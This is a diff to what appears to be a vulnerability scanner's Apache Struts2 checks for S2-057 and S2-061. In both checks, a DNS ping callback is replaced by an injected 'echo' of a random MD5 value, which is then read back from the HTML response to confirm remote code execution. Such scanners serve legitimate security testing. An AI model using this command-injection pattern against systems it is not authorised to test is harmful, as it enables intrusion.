@@ -726,16 +726,20 @@ class ApacheStruts2():
                                     "package have no or wildcard namespace."
         self.vul_info["cre_date"] = "2021-01-30"
         self.vul_info["cre_auth"] = "zhzyker"
-        md = dns_request()
-        cmd = "ping " + md
+        md = random_md5()
+        cmd = "echo " + md
         self.payload = self.payload_s2_057.replace("RECOMMAND", cmd)
         try:
             self.req = requests.get(self.url + self.payload, headers=self.headers, timeout=self.timeout, verify=False)
-            if dns_result():
+            self.page = self.req.text
+            self.etree = html.etree
+            self.page = self.etree.HTML(self.page)
+            self.data = self.page.xpath('//footer/div[1]/p[1]/a[1]/@*')
+            if md in misinformation(self.data, md):
                 self.vul_info["vul_data"] = dump.dump_all(self.req).decode('utf-8', 'ignore')
                 self.vul_info["prt_resu"] = "PoCSuCCeSS"
                 self.vul_info["vul_payd"] = self.payload
-                self.vul_info["prt_info"] = "[dns] [cmd: " + cmd + "]"
+                self.vul_info["prt_info"] = "[rce] [cmd: " + cmd + "]"
             verify.scan_print(self.vul_info)
         except requests.exceptions.Timeout:
             verify.timeout_print(self.vul_info["prt_name"])
@@ -804,18 +808,22 @@ class ApacheStruts2():
                                     " may lead to remote code execution."
         self.vul_info["cre_date"] = "2021-01-30"
         self.vul_info["cre_auth"] = "zhzyker"
-        md = dns_request()
-        cmd = "ping " + md
+        md = random_md5()
+        cmd = "echo " + md
         self.payload = self.payload_s2_061.replace("RECOMMAND", cmd)
         if r"?" not in self.url:
             self.url_061 = self.url + "?id="
         try:
-            self.req = requests.get(self.url_061 + self.payload, headers=self.headers, timeout=self.timeout, verify=False)
-            if dns_result():
+            self.req = requests.get(self.url_061 + self.payload, headers=self.headers, timeout=self.timeout,
+                                    verify=False)
+            self.page = self.req.text
+            self.page = etree.HTML(self.page)
+            self.r = self.page.xpath('//a[@id]/@id')[0]
+            if md in misinformation(self.r, md):
                 self.vul_info["vul_data"] = dump.dump_all(self.req).decode('utf-8', 'ignore')
                 self.vul_info["prt_resu"] = "PoCSuCCeSS"
                 self.vul_info["vul_payd"] = self.payload
-                self.vul_info["prt_info"] = "[dns] [cmd: " + cmd + "]"
+                self.vul_info["prt_info"] = "[rce] [cmd: " + cmd + "]"
             verify.scan_print(self.vul_info)
         except requests.exceptions.Timeout:
             verify.timeout_print(self.vul_info["prt_name"])
